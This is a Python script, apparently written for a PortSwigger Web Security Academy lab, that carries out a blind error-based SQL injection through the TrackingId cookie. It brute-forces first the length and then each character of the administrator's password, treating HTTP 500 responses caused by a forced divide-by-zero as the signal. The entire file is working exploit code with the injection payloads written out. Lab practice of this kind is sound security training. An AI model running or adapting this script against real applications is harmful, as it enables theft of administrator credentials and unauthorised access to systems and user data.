import requests

session = requests.Session()
target_url = "https://0a9b00910341f2ab81a1675300960092.web-security-academy.net"
payload_placeholder = "$$$"
index_placeholder = "<idx>"
chars_payload = "'||(SELECT CASE WHEN SUBSTR(password, <idx>, 1)='$$$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" 
length_payload = "'||(SELECT CASE WHEN (LENGTH(password)=$$$) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

# first, find out length of the password
pword_length = -1
potential_len = 0
while pword_length == -1:
    # send in a request to find the length of the password. Keep incrementing counter until we find the length
    payload = length_payload.replace(payload_placeholder, str(potential_len))
    response = session.get(target_url, cookies={"TrackingId": payload})

    print("Tested payload: " + payload)

    if response.status_code == 500:
        pword_length = potential_len
    
    potential_len += 1

    # short circuit if we go too far
    if potential_len > (255):
        break

print("\nLength of password is " + str(pword_length), end="\n\n")

# now, loop through and find each character of the password.
# the substring indexing is 1-indexed
password = ""
for i in range(1, pword_length + 1):
    for c in chars:
        payload = chars_payload.replace(payload_placeholder, c).replace(index_placeholder, str(i))
        response = session.get(target_url, cookies={"TrackingId": payload})

        print("Tested payload: " + payload)

        if response.status_code == 500:
            password += c
            print("\nFound new character! New password is: " + password, end="\n\n")
            break

print(f"Found password: {password}, length {len(password)}")